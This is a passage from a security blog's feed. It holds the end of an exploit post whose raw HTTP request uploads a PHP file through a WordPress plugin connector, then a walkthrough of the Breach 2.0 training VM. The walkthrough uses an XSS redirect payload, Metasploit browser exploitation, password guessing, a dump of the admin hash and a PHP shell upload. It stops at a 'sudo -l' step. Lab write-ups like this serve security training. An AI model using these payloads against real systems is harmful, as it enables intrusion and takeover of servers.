+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /wordpress/wp-content/plugins/cysteme-finder/php/connector.php?wphome=/var/www/wordpress/&lt;span class=&quot;err&quot;&gt;&amp;amp;&lt;/span&gt;wpurl=http://example.com HTTP/1.1
+Host: http://example.com
+Content-Length: 314
+Origin: http://example.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36
+Content-Type: multipart/form-data; boundary=--------723608748
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Connection: close
+
+----------723608748
+Content-Disposition: form-data; name=&quot;cmd&quot;
+
+upload
+----------723608748
+Content-Disposition: form-data; name=&quot;target&quot;
+
+l1_Lw
+----------723608748
+Content-Disposition: form-data; name=&quot;upload[]&quot;; filename=&quot;test.php&quot;
+Content-Type: text/html
+
+&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;phpinfo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+----------723608748--
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;timeline&quot;&gt;Timeline:&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;08/20/2016 - Discovered&lt;/li&gt;
+  &lt;li&gt;08/24/2016 - Reported to Developer&lt;/li&gt;
+  &lt;li&gt;08/28/2016 - No reply from developer.&lt;/li&gt;
+  &lt;li&gt;09/01/2016 - Published on &lt;a href=&quot;https://www.exploit-db.com/exploits/40295/&quot;&gt;Exploit-DB&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;</content><author><name>T0w3ntum</name></author><summary type="html">Summary</summary></entry><entry><title type="html">Breach 2.0</title><link href="http://localhost:4000/2016-08-22/breach-2" rel="alternate" type="text/html" title="Breach 2.0" /><published>2016-08-22T00:00:00-05:00</published><updated>2016-08-22T00:00:00-05:00</updated><id>http://localhost:4000/2016-08-22/breach-2</id><content type="html" xml:base="http://localhost:4000/2016-08-22/breach-2">&lt;p&gt;This has been one of the funner vulnerable VM’s I’ve done over at vulnhub so far. mrb3n813
+sure can knock them out!&lt;/p&gt;
+
+&lt;h2 id=&quot;breach-20&quot;&gt;&lt;a href=&quot;https://www.vulnhub.com/entry/breach-2,159/&quot;&gt;Breach 2.0&lt;/a&gt;&lt;/h2&gt;
+
+&lt;p&gt;Let’s start with a quick nmap scan and see what we are working with.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Vulnhub/Breach2# nmap -p- -T4 --min-rate=400 192.168.110.151
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-08-15 19:23 EDT
+Nmap scan report for 192.168.110.151
+Host is up (0.0011s latency).
+Not shown: 65532 closed ports
+PORT      STATE SERVICE
+111/tcp   open  rpcbind
+48983/tcp open  unknown
+65535/tcp open  unknown
+MAC Address: 00:0C:29:C5:9E:D6 (VMware)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Looks like we have a couple of unknown ports so let’s enumerate those some more.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Vulnhub/Breach2# nmap -p 111,48983,65535 -sV -A 192.168.110.151
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-08-15 19:24 EDT
+Nmap scan report for 192.168.110.151
+Host is up (0.00076s latency).
+PORT      STATE SERVICE VERSION
+111/tcp   open  rpcbind 2-4 (RPC #100000)
+| rpcinfo:
+|   program version   port/proto  service
+|   100000  2,3,4        111/tcp  rpcbind
+|   100000  2,3,4        111/udp  rpcbind
+|   100024  1          33962/udp  status
+|_  100024  1          48983/tcp  status
+48983/tcp open  status  1 (RPC #100024)
+65535/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u2 (protocol 2.0)
+| ssh-hostkey:
+|   1024 f3:53:9a:0b:40:76:b1:02:87:3e:a5:7a:ae:85:9d:26 (DSA)
+|   2048 9a:a8:db:78:4b:44:4f:fb:e5:83:6b:67:e3:ac:fb:f5 (RSA)
+|_  256 c1:63:f1:dc:8f:24:81:82:35:fa:88:1a:b8:73:40:24 (ECDSA)
+MAC Address: 00:0C:29:C5:9E:D6 (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1
+closed port
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.2 - 4.0
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.76 ms 192.168.110.151
+
+OS and Service detection performed. Please report any incorrect results at
+https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 35.30 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;SSH is running on 65535. Let’s have a look at that banner.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Vulnhub/Breach2# ssh -p 65535 peter@192.168.110.151
+#############################################################################
+#                  Welcome to Initech Cyber Consulting, LLC                 #
+#                 All connections are monitored and recorded                #
+#                     Unauthorized access is encouraged                     #
+#             Peter, if that's you - the password is in the source.         #
+#          Also, stop checking your blog all day and enjoy your vacation!   #
+#############################################################################
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The password is in the source…Interesting. So far I haven’t seen any source code or web
+pages so I’m not sure what this means. I decided to go digging some more, did a quick UDP
+scan and came up with this.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Vulnhub/Breach2# nmap -sU --top-ports 100 192.168.110.151
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-08-15 19:27 EDT
+Nmap scan report for 192.168.110.151
+Host is up (0.0011s latency).
+Not shown: 98 closed ports
+PORT     STATE SERVICE
+111/udp  open  rpcbind
+5353/udp open  zeroconf
+MAC Address: 00:0C:29:C5:9E:D6 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 113.22 seconds
+root@kali:~/Vulnhub/Breach2# nmap -sU -p U:5353 192.168.110.151 -A
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-08-15 19:31 EDT
+Nmap scan report for 192.168.110.151
+Host is up (0.00082s latency).
+PORT     STATE SERVICE VERSION
+5353/udp open  mdns    DNS-based service discovery
+| dns-service-discovery:
+|   9/tcp workstation
+|_    Address=192.168.110.151 fe80:0:0:0:20c:29ff:fec5:9ed6
+MAC Address: 00:0C:29:C5:9E:D6 (VMware)
+Too many fingerprints match this host to give specific OS details
+Network Distance: 1 hop
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.82 ms 192.168.110.151
+
+OS and Service detection performed. Please report any incorrect results at
+https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 23.81 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So some DNS service running on UDP 5353. Might be of use later, but for now I couldn’t
+enumerate it much. I decided to go back to the SSH banner…Maybe mrb3n813 is playing a
+trick on us.&lt;/p&gt;
+
+&lt;p&gt;I tried multiple attemps until I finally landed on &lt;strong&gt;inthesource&lt;/strong&gt;. I assume this was the
+right password when we are thrown out of SSH after one attempt instead of the standard
+three. So now I know the password, but that didn’t get me anywhere. Knowing how these VM’s
+work though, let’s see if another port opened up.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Vulnhub/Breach2# nmap -p- -T4 --min-rate=400 192.168.110.151
+
+Starting Nmap 7.01 ( https://nmap.org ) at 2016-08-15 21:03 EDT
+Nmap scan report for 192.168.110.151
+Host is up (0.0012s latency).
+Not shown: 65531 closed ports
+PORT      STATE SERVICE
+80/tcp    open  http
+111/tcp   open  rpcbind
+48983/tcp open  unknown
+65535/tcp open  unknown
+MAC Address: 00:0C:29:C5:9E:D6 (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 20.52 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Look at that, now we have a webpage!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/breach2/beef.jpg&quot; alt=&quot;BEEF&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A slight hint maybe ;)&lt;/p&gt;
+
+&lt;p&gt;Remembering the SSH text, a quick browse to http://192.168.110.151/blog/ gives me a nice
+little blog page. Looks like it’s running BlogPHP and appears to be vulnerable to some
+stored XSS per this &lt;a href=&quot;https://www.exploit-db.com/exploits/17640/&quot;&gt;Exploit-db&lt;/a&gt; entry.&lt;/p&gt;
+
+&lt;p&gt;I injected some code to redirect the client to my machine so I can capture the user agent&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;script&amp;gt;window.location.replace(&quot;http://192.168.110.128/random&quot;);&amp;lt;/script&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And capture the user agent.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/breach2/user-angent.png&quot; alt=&quot;User Agent&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Looks like I’m dealing with Firefox 5.0, lucky for us Metasploit has a module for this. It was as simple as shutting down apache
+and loading up the module. What is missing from the below screenshot is me upgradating to a meterpreter shell with&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;sessions -u 1&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/breach2/low-priv.png&quot; alt=&quot;Low Priv&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Sweet, we now have a shell as peter. I do some digging and find some interesting stuff in Miltons profile.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;
+/home/milton
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .profile
+&lt;span class=&quot;c&quot;&gt;# ~/.profile: executed by the command interpreter for login shells.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# exists.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# see /usr/share/doc/bash/examples/startup-files for examples.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# the files are located in the bash-doc package.&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# the default umask is set in /etc/profile; for setting the umask&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# for ssh logins, install and configure the libpam-umask package.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#umask 022&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# if running bash&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BASH_VERSION&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# include .bashrc if it exists&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$HOME&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/.bashrc&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$HOME&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/.bashrc&quot;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;fi
+fi&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# set PATH so it includes user's private bin if it exists&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$HOME&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/bin&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
+    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PATH&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$HOME&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;/bin:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PATH&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;fi
+
+&lt;/span&gt;python /usr/local/bin/cd.py
+&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; /etc/init.d/nginx start &amp;amp;&amp;gt; /dev/null
+
+&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Sorry, user milton may not run sudo on breach2.&quot;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;readonly&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rwxr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;xr&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;milton&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;milton&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;380&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Jun&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;29&lt;/span&gt; &lt;span class=&quot;mo&quot;&gt;01&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;09&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt;
+&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#!/usr/bin/python&lt;/span&gt;
+
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;signal&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;time&lt;/span&gt;
+&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;os&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SIGINT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SIG_IGN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;countdown&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;countdown&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;countdown&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;countdown&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;countdown&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;question&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;raw_input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Whose stapler is it?&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;question&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;mine&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;echo 'Woot!'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+
+        &lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;kill -9 &lt;/span&gt;&lt;span class=&quot;si&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;d&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;os&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;getppid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()))&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SIGINT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So it looks like when Milton logs in, it starts nginx and asks a simple question. This looks like the next logical step, only
+problem is I don’t know Miltons password. A little more digging turned up an interesting port listening on localhost that I
+didn’t see in the nmap scans.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;peter@breach2:/usr/local/bin$ netstat -lntp
+netstat -lntp
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:57243           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:65535           0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:2323          0.0.0.0:*               LISTEN      -
+tcp6       0      0 :::45131                :::*                    LISTEN      -
+tcp6       0      0 :::111                  :::*                    LISTEN      -
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Possibly telnet?&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;telnet 127.0.0.1 2323
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is '^]'.
+29 45'46&quot; N 95 22'59&quot; W
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Look at that, some interesting coordinates. Quick search on google maps show’s it to be Houston Texas, possibly Miltons password?&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/breach2/milton-user.png&quot; alt=&quot;Milton&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;I tried a couple variations of Houston Texas before landing on &lt;strong&gt;Houston&lt;/strong&gt;…Yeah, the obviouse one right :). Anyway, we are now
+in as Milton and a quick check shows that nginx started and is listening on 8888.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;milton@breach2:/var/www/html2/oscommerce$ ps -aux | grep nginx
+root      2315  0.0  0.6  91184  3076 ?        Ss   19:14   0:00 nginx: master process /usr/sbin/nginx -g daemon on;
+master_process on;
+root      2316  0.0  0.7  91492  3696 ?        S    19:14   0:00 nginx: worker process
+root      2317  0.0  0.7  91492  3696 ?        S    19:14   0:00 nginx: worker process
+root      2318  0.0  0.7  91492  3696 ?        S    19:14   0:00 nginx: worker process
+root      2319  0.0  0.7  91492  3696 ?        S    19:14   0:00 nginx: worker process
+milton    2420  0.0  0.4  12732  2036 pts/3    S+   19:17   0:00 grep nginx
+milton@breach2:/var/www/html2/oscommerce$ netstat -lntp
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 0.0.0.0:8888            0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:57243           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:65535           0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:2323          0.0.0.0:*               LISTEN      -
+tcp6       0      0 :::8888                 :::*                    LISTEN      -
+tcp6       0      0 :::45131                :::*                    LISTEN      -
+tcp6       0      0 :::111                  :::*                    LISTEN      -
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+tcp6       0      0 ::1:2323                :::*                    LISTEN      -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Looks like nginx was running an oscommerce CMS on port 8888. I went ahead and dumped the admin hash from the MySQL database and
+started poking around the admin interface. The admin hash was easy enough to google, it’s just &lt;strong&gt;admin&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;milton@breach2:/var/www/html2/oscommerce$ mysql -u root
+
+mysql&amp;gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| blog               |
+| mysql              |
+| oscommerce         |
+| performance_schema |
++--------------------+
+5 rows in set (0.08 sec)
+
+mysql&amp;gt; use oscommerce;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql&amp;gt; show tables;
++-------------------------------------------+
+| Tables_in_oscommerce                      |
++-------------------------------------------+
+| osc_address_book                          |
+| osc_administrators                        |
++-------------------------------------------+
+CUT SOME TEXT
+
+mysql&amp;gt; select * from osc_administrators;
++----+-----------+-------------------------------------+
+| id | user_name | user_password                       |
++----+-----------+-------------------------------------+
+|  1 | admin     | 685cef95aa31989f2edae5e055ffd2c9:32 |
++----+-----------+-------------------------------------+
+1 row in set (0.00 sec)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Within the oscommerce admin interface, there was a place to upload files. This screenshot is missing for some reason so I’ll go
+back and get it later and update the post with it. Anyway, I was able to upload a php shell and execute it getting a connection
+back as yet another user!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/images/breach2/next-user.png&quot; alt=&quot;Blumbergh&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;This part was the fun part, easy, but fun. As always, I check the users permissions.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ sudo -l
